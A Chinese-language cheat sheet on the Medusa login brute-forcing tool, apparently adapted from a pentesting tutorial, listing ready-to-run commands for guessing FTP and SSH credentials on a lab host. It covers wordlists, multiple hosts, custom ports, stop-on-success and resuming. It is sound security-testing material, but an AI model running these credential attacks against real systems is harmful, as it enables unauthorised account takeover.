## medusa综合指南 [^1]

### Introduction to Medusa and its features

- 主要功能：
  - 基于线程的并行测试；可以同时对多个主机，用户或密码执行暴力测试
  - 灵活的用户输入；可以通过多种方式指定目标信息（主机/用户/密码）。例如，每个项目可以是单个条目，也可以是包含多个条目的文件。此外，组合文件格式允许用户优化其目标列表
  - 模块化设计；每个服务模块都作为独立的`.mod`文件存在，这意味着不需要对核心应用程序进行任何修改，以扩展支持的强制服务列表
  - 支持多种协议；目前支持许多服务（例如SMB，HTTP，POP3，MS-SQL，SSHv2等）
- **语法：** `Medusa [-h host | -H file] [-u username | -U file] [-p password | -P file] [-C file] -M module [OPT]`
- `medusa -d`

### Password Cracking For Specific Username

- `medusa -h 192.168.1.108 -u raj -P pass.txt -M ftp`

### Username Cracking for Specific Password

- `medusa -h 192.168.1.108 -U user.txt -p 123 -M ftp`

### Cracking Login Credential

- `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp`

### Making Brute Force Attack on Multiple Host

- `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp`
- `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -T 1` [^2]
- `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -T 2` [^3]

### Attacking on Specific Port Instead of Default

- `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ssh`
- `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ssh -n 2222`

### NULL/Same as Login Attempt

- `medusa -h 192.168.1.108 -u raj -P pass.txt -M ftp -e ns` [^4]

### Save logs to Disk

- `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp -O log.txt` [^5]

### Stop on Success

- `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp -f` [^6]
- `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -F `[^7]

### Suppress Startup Banner

- `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -b` [^8]

### Verbose Mode

- `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -v 1` [^9]
- `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -v 2`
- `medusa -H hosts.txt -U user.txt -P pass.txt -M ftp -v 6`

### Error Debugging Mode

- `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp -w 01` [^10]
- `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp -w 06`
- `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp -w 07`

### Using Combo Entries

- `medusa -M ftp -C userpass.txt` [^11]

### Resuming the Brute Force Attack

- `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp` [^12]
- `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp -Z h1u2u3`
- `medusa -h 192.168.1.108 -U user.txt -P pass.txt -M ftp -Z h1u3u4`

[原文](https://www.hackingarticles.in/comprehensive-guide-on-medusa-a-brute-forcing-tool/)

---

[^1]: Medusa 是一个快速，并行，模块化的登录暴力破解工具；目标是支持尽可能多的允许远程身份验证的服务
[^2]: 主机列表中有多个主机IP，并且希望仅对少数主机进行强力攻击，则使用**-T选项**同时测试要测试的主机总数
[^3]: 同时对两个主机IP进行暴力攻击
[^4]: Additional password checks ([n] No Password, [s] Password = Username)
[^5]:  `-O`：将输出保存在文本文件
[^6]: 找到第一个有效的用户名/密码后停止对主机的暴力攻击
[^7]: 找到第一个有效的用户名/密码后停止停止审计
[^8]: 禁止输出软件banner信息
[^9]: 详细模式：[0-6]；错误调试参数：[0-10]
[^10]: **错误调试模式**：级别为0-10；调试模式显示等待时间，套接字，发送数据大小和接收的数据大小，模块详细信息和路径
[^11]: **使用组合条目**：组合文件每行有一个记录，并以冒号分隔的格式为**host_IP：username：password**；如果三个字段中的任何一个留空，则相应的信息应作为全局值或作为文件中的列表传递
[^12]: **恢复攻击**：使用**-z选项**以继续从最后一次删除的字典尝试中执行